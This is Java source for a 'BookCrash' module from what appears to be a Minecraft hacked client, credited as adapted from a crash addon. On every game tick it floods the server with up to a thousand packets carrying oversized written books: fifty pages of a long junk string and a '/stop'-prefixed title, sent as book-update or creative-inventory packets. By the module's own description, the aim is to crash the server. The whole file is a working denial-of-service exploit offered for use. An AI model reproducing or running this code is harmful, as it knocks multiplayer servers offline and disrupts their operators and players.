package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.*;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import mathax.client.utils.Utils;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtList;
import net.minecraft.nbt.NbtString;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.util.ArrayList;
import java.util.Optional;

/*/------------------------------------------------------------------------------------------------------------------------/*/
/*/ Used from Meteor Crash Addon by Wide Cat                                                                               /*/
/*/ https://github.com/Wide-Cat/meteor-crash-addon/blob/main/src/main/java/widecat/meteorcrashaddon/modules/BookCrash.java /*/
/*/------------------------------------------------------------------------------------------------------------------------/*/

public class BookCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    // General

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("Which type of packet to send.")
        .defaultValue(Mode.Book_Update)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many packets to send to the server per tick.")
        .defaultValue(100)
        .min(1)
        .sliderRange(1, 1000)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public BookCrash() {
        super(Categories.Crash, Items.WRITABLE_BOOK, "book-crash", "Tries to crash the server by sending bad book sign packets.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (Utils.canUpdate()) for (int i = 0; i < amount.get(); i++) sendBadBook();
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }

    private void sendBadBook() {
        String title = "/stop" + Math.random() * 400;
        String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";

        switch (mode.get()) {
            case Book_Update -> {
                ArrayList<String> pages = new ArrayList<>();

                for (int i = 0; i < 50; i++) {
                    StringBuilder page = new StringBuilder();
                    page.append(mm255);
                    pages.add(page.toString());
                }

                mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
            }
            case Creative_Action -> {
                ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
                String author = "Matejko06" + Math.random() * 400;
                NbtList pageList = new NbtList();

                for (int i = 0; i < 50; ++i) {
                    pageList.addElement(i, NbtString.of(mm255));
                }

                book.setSubNbt("title", NbtString.of(title));
                book.setSubNbt("author", NbtString.of(author));
                book.setSubNbt("pages", pageList);

                mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(0, book));
            }
        }
    }

    public enum Mode {
        Book_Update("Book Update"),
        Creative_Action("Creative Action");

        private final String title;

        Mode(String title) {
            this.title = title;
        }

        @Override
        public String toString() {
            return title;
        }
    }
}
